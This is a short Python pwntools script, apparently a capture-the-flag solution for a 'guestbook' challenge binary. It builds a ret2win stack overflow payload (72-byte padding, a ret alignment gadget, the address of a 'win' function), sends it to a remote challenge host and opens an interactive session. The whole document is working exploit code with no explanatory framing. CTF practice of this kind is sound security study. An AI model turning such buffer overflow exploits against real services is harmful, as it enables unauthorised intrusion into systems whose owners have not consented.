#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./guestbook', checksec=False)

# python3 -c "from pwn import *; print(cyclic(200))"
OFFSET_TO_RIP = 72

# ROPgadget --binary ./guestbook  | grep ": ret$" 
ret_gadget = 0x40101a

p = remote("offsec.m0lecon.it", 13576)
p.recvuntil(b"name?\n")
payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret_gadget),
    p64(elf.sym.win),
)
p.send(payload)
p.interactive()
